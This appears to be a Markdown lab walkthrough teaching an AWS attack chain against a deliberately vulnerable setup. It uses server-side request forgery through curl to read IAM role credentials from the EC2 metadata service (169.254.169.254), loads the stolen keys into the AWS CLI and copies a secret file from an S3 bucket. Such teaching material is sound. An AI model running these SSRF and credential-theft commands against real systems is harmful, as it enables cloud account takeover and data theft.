# The biggest Hack of our lives ðŸ¤‘ðŸ¤‘ðŸ¤‘:

## Our goal:

![Our goal](./images/Picture%201.png)

## Execution:

### Step 1:

![Hiding our identity](./images/Picture%202.png)

<details>
  <summary>Answer</summary>
  
  âœ… VPN

  âœ… TOR

  Let's try sending a request - here is what we can do:

  ```bash
    export IP=XXXXX
    curl $IP
  ```

</details>




### Step 2:

EC2 instances connect to metadata services to get information about themselves such as:

- what region am I located in?
- what role is attaced to this instance?

![EC2 to Metadata Service](./images/Picture%203.png)

#### How AWS Works:

An EC2 has a role based policy it can use to access an s3 bucket. However, it hasn't been authenticated to use the role yet!

![EC2 to s3](./images/Picture%204.png)

It asks the EC2 metadata service to get the credentials of the role in order to access it.

![EC2 to metadata](./images/Picture%205.png)

Then we can get access to the bucket:

![EC2 to s3 success](./images/Picture%206.png)

What are some ways we can take advantage of this to access the bucket ourselves?

<details>
  <summary>Answer</summary>
  
  âœ… Server Side Request Forgery

  Let's try sending a request - here is what we can do:

Get the metadata:

  ```bash
    curl "http://$IP/?url=http://169.254.169.254/latest/meta-data/"

  ```

Peek into the IAM folder:

```bash
curl "http://$IP/?url=http://169.254.169.254/latest/meta-data/iam/"
```

ooooh.... security credentials:

```bash
curl "http://$IP/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

```bash
curl "http://$IP/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/VulnV1-webServerRole-EuxRuT802MC4"
```


</details>

### Step 3: Let's configure our AWS client:

```bash
export AWS_ACCESS_KEY_ID="..."
```

```bash
export AWS_SECRET_ACCESS_KEY="..."
```

```bash
export AWS_SESSION_TOKEN="..."
```

Now let's see if we have access to s3 buckets...

```
aws ls s3
```


<details>
  <summary>Gold Mine??</summary>

Let's copy the file!!
  
  ```bash
aws s3 cp s3://vulnv1-databucket-x902jzasnmdo/secret-file.txt .
```

</details>